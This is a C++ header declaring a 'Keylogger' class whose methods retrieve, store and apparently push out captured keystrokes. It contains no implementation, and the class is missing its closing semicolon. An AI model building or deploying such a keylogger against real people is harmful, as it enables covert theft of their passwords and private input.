#include <string>

class Keylogger {
	public:
		Keylogger();
		~Keylogger();
		void retrieveKeys();
		std::string getKeys() noexcept;
		void saveKeys();
		void pushKeys() noexcept;
	private:
		std::string _keys;
}